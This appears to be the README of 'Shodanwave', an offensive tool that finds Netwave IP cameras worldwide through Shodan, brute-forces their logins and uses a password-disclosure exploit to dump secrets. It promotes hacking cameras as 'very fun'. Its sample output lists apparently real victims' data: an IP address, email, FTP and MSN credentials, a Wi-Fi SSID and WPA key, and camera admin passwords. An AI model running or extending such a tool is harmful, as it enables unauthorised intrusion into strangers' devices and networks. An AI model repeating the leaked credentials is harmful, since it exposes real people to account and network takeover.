# Shodonwave 

Shodanwave is a tool for exploring and obtaining information from cameras specifically Netwave IP Camera. The tool uses a search engine called shodan that makes it easy to search for cameras online but not only that.

Hack network cameras around the world, Very fun!

What does the tool to? Look, a list!

 * Search 
 * Brute force
 * SSID and WPAPSK Password Disclosure
 * E-mail, FTP, DNS, MSN Password Disclosure 
 * Exploit


Here is an example of shodan wave running and showing the full output...

```

Usage: python shodanwave.py -u usernames.txt -w passwords.txt  -k Shodan API key
       python shodanwave.py --help 
         __              __                                   
   _____/ /_  ____  ____/ /___ _____ _      ______ __   _____ 
  / ___/ __ \/ __ \/ __  / __ `/ __ \ | /| / / __ `/ | / / _ \
 (__  ) / / / /_/ / /_/ / /_/ / / / / |/ |/ / /_/ /| |/ /  __/
/____/_/ /_/\____/\__,_/\__,_/_/ /_/|__/|__/\__,_/ |___/\___/ 
                                                              

This tool is successfully connected to shodan service
Information the use of this tool is illegal, not bad.

[+] Shodan successfully Connected.
[+] Shodan Exploit Enabled.
[+] Netwave IP Camera Found: 111307
[+] Passwords loaded: 12
[!] Disable password discovery module? (Yes/no): Yes
[+] Password Found admin@123456
[!] Trying to get more information
[+] Email: basile.antonio@orange.fr:vitaline19
[+] FTP: ftp://basile.an1tonio.perso.sfr.fr:vitalineD519@http://ftpperso.sfr.fr/:21
[+] MSN: camera-rousselin1@hotmail.fr@vitaline19
[!] Getting System Information
[!] Getting Wireless System Information
[+] Mac address found E8ABFA1A9374
[+] Host: http://186.193.55.18:8080
[+] Country: n/a
[+] Organization: Nettel Telecomunicações Ltda.
[+] Product: Netwave IP camera http config
[+] SSID: moslekok
[+] WPAPSK: TulSokanLoptatok
[+] Starting to read memory dump.. this could take a few minutes
[+] CTRL+C to exit..
[+] Binary data: 70560
[+] Strings in binary data found.. password should be around line 10000
[+] Mac address triggered.. printing the following dumps, could leak username and passwords..
[+] Firstline... CAMERA2
[+] Possible username: admin
[+] Possible password: ac00310
[+] Following line.. 

```
### Install Requirements
```
pip install -r /path/to/requirements.txt
```
You need the API key to run. You can get a key free on https://www.shodan.io/

### References:

 * [Shodan API](https://www.shodan.io/)  search engine for Internet-connected devices.
 * [Requests](http://docs.python-requests.org/en/master/) Requests: HTTP for Humans
 * [Netwave Exploit](https://www.exploit-db.com/exploits/41236/) Netwave IP Camera - Password Disclosure
